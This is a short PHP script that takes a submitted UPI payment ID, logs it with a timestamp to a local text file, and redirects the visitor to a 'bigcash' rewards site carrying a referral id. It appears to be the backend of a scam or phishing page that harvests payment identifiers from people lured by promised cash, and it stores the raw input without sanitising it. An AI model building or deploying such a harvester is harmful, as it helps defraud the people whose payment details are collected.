<?php
date_default_timezone_set("Asia/Kolkata"); // India time zone set

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $upi = trim($_POST["upi"]);
    if (!empty($upi)) {
        $date = date("Y-m-d");
        $time = date("H:i:s");
        $entry = "$upi | $date | $time" . PHP_EOL;
        file_put_contents("data.txt", $entry, FILE_APPEND);
        header("Location: https://bigcash.live/?i=134683333");
        exit();
    }
}
?>